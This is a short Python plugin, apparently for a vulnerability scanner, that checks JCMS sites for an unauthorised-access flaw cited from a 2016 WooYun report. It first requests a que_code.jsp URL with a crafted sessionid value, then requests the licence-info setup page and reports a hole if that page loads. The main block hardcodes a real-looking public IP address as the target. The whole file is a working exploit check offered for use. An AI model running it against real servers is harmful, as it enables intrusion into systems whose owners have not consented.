#!/usr/bin/env python
# -*- coding: utf-8 -*-
#refer:http://www.wooyun.org/bugs/wooyun-2016-0178011
#author:bet666


def assign(service, arg): 
    if service == "jcms":
        return True, arg
    
def audit(arg):
    payload1 = 'jcms/setup/opr_licenceinfo.jsp'
    payload2 = 'jcms/jcms_files/jcms1/web1/site/module/oss/que_code.jsp?sessionid=cookie_username'
    code, head, res, _, _ = curl.curl2(arg + payload2)
    if code ==200:
        code, head, res, _, _ = curl.curl2(arg + payload1)
        if code ==200 and 'Licence' in res:
            security_hole(arg+payload1)
           
if __name__ == '__main__': 
    from dummy import *
    audit(assign('jcms', 'http://221.2.150.168:8080/')[1])